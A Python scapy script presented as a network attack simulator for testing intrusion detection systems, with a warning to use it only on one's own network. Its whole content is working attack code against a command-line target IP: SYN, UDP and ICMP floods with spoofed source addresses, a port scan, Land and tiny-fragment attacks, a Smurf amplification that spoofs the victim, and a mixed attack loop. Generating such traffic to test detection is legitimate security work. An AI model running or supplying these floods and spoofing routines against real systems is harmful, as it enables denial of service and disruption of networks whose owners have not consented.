#!/usr/bin/env python3
"""
Network Attack Simulator for Testing IDS
WARNING: Use only for testing purposes on your own network!
"""

from scapy.all import *
import time
import random
import threading
import argparse

def syn_flood(target_ip, target_port=80, count=100, delay=0.01):
    """Simulate SYN flood attack"""
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    
    for i in range(count):
        # Random source IP and port
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)
        
        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        
        # Send packet
        send(packet, verbose=0)
        
        if i % 10 == 0:
            print(f"Sent {i} SYN packets...")
        
        time.sleep(delay)
    
    print(f"SYN flood complete. Sent {count} packets.")

def udp_flood(target_ip, target_port=53, count=100, delay=0.01):
    """Simulate UDP flood attack"""
    print(f"Starting UDP flood attack on {target_ip}:{target_port}")
    
    for i in range(count):
        # Random source IP and port
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)
        
        # Create UDP packet with random payload
        payload = "A" * random.randint(10, 1000)
        packet = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / payload
        
        # Send packet
        send(packet, verbose=0)
        
        if i % 10 == 0:
            print(f"Sent {i} UDP packets...")
        
        time.sleep(delay)
    
    print(f"UDP flood complete. Sent {count} packets.")

def icmp_flood(target_ip, count=100, delay=0.01):
    """Simulate ICMP flood attack"""
    print(f"Starting ICMP flood attack on {target_ip}")
    
    for i in range(count):
        # Random source IP
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        
        # Create ICMP packet
        packet = IP(src=src_ip, dst=target_ip) / ICMP()
        
        # Send packet
        send(packet, verbose=0)
        
        if i % 10 == 0:
            print(f"Sent {i} ICMP packets...")
        
        time.sleep(delay)
    
    print(f"ICMP flood complete. Sent {count} packets.")

def port_scan(target_ip, start_port=1, end_port=1000, delay=0.1):
    """Simulate port scanning attack"""
    print(f"Starting port scan on {target_ip} (ports {start_port}-{end_port})")
    
    src_ip = f"192.168.1.{random.randint(1, 254)}"
    
    for port in range(start_port, end_port + 1):
        # Create SYN packet for port scan
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), 
                                                   dport=port, flags="S")
        
        # Send packet
        send(packet, verbose=0)
        
        if port % 50 == 0:
            print(f"Scanned up to port {port}...")
        
        time.sleep(delay)
    
    print(f"Port scan complete. Scanned {end_port - start_port + 1} ports.")

def land_attack(target_ip, target_port=80, count=10):
    """Simulate Land attack (same source and destination)"""
    print(f"Starting Land attack on {target_ip}:{target_port}")
    
    for i in range(count):
        # Same source and destination IP (Land attack)
        packet = IP(src=target_ip, dst=target_ip) / TCP(sport=target_port, 
                                                       dport=target_port, flags="S")
        
        # Send packet
        send(packet, verbose=0)
        print(f"Sent Land attack packet {i+1}")
        
        time.sleep(0.5)
    
    print("Land attack complete.")

def fragmented_attack(target_ip, count=20):
    """Simulate fragmented packet attack"""
    print(f"Starting fragmented packet attack on {target_ip}")
    
    for i in range(count):
        # Create fragmented packets
        payload = "A" * 2000  # Large payload to force fragmentation
        packet = IP(src=f"192.168.1.{random.randint(1, 254)}", dst=target_ip) / UDP(dport=80) / payload
        
        # Fragment the packet
        fragments = fragment(packet, fragsize=8)
        
        for frag in fragments:
            send(frag, verbose=0)
        
        print(f"Sent fragmented packet set {i+1}")
        time.sleep(0.2)
    
    print("Fragmented attack complete.")

def smurf_attack(target_ip, broadcast_ip="192.168.1.255", count=50):
    """Simulate Smurf attack (ICMP amplification)"""
    print(f"Starting Smurf attack on {target_ip} via {broadcast_ip}")
    
    for i in range(count):
        # ICMP packet with spoofed source (victim's IP) to broadcast address
        packet = IP(src=target_ip, dst=broadcast_ip) / ICMP()
        
        # Send packet
        send(packet, verbose=0)
        
        if i % 10 == 0:
            print(f"Sent {i} Smurf packets...")
        
        time.sleep(0.1)
    
    print("Smurf attack complete.")

def mixed_attack_pattern(target_ip, duration=30):
    """Simulate mixed attack pattern"""
    print(f"Starting mixed attack pattern on {target_ip} for {duration} seconds")
    
    start_time = time.time()
    attack_count = 0
    
    while time.time() - start_time < duration:
        attack_type = random.choice(['syn', 'udp', 'icmp', 'scan'])
        
        if attack_type == 'syn':
            syn_flood(target_ip, count=5, delay=0.01)
        elif attack_type == 'udp':
            udp_flood(target_ip, count=5, delay=0.01)
        elif attack_type == 'icmp':
            icmp_flood(target_ip, count=5, delay=0.01)
        elif attack_type == 'scan':
            port_scan(target_ip, start_port=random.randint(1, 100), 
                     end_port=random.randint(101, 200), delay=0.01)
        
        attack_count += 1
        time.sleep(1)
    
    print(f"Mixed attack complete. Executed {attack_count} attack sequences.")

def main():
    parser = argparse.ArgumentParser(description='Network Attack Simulator for IDS Testing')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('--attack-type', choices=['syn', 'udp', 'icmp', 'scan', 'land', 'frag', 'smurf', 'mixed'], 
                       default='syn', help='Type of attack to simulate')
    parser.add_argument('--count', type=int, default=100, help='Number of packets to send')
    parser.add_argument('--delay', type=float, default=0.01, help='Delay between packets (seconds)')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--duration', type=int, default=30, help='Duration for mixed attack (seconds)')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("NETWORK ATTACK SIMULATOR")
    print("WARNING: Use only for testing on your own network!")
    print("=" * 60)
    
    try:
        if args.attack_type == 'syn':
            syn_flood(args.target_ip, args.port, args.count, args.delay)
        elif args.attack_type == 'udp':
            udp_flood(args.target_ip, args.port, args.count, args.delay)
        elif args.attack_type == 'icmp':
            icmp_flood(args.target_ip, args.count, args.delay)
        elif args.attack_type == 'scan':
            port_scan(args.target_ip, 1, args.count, args.delay)
        elif args.attack_type == 'land':
            land_attack(args.target_ip, args.port, args.count)
        elif args.attack_type == 'frag':
            fragmented_attack(args.target_ip, args.count)
        elif args.attack_type == 'smurf':
            smurf_attack(args.target_ip, count=args.count)
        elif args.attack_type == 'mixed':
            mixed_attack_pattern(args.target_ip, args.duration)
            
    except KeyboardInterrupt:
        print("\nAttack simulation stopped by user.")
    except Exception as e:
        print(f"Error during attack simulation: {e}")

if __name__ == "__main__":
    main()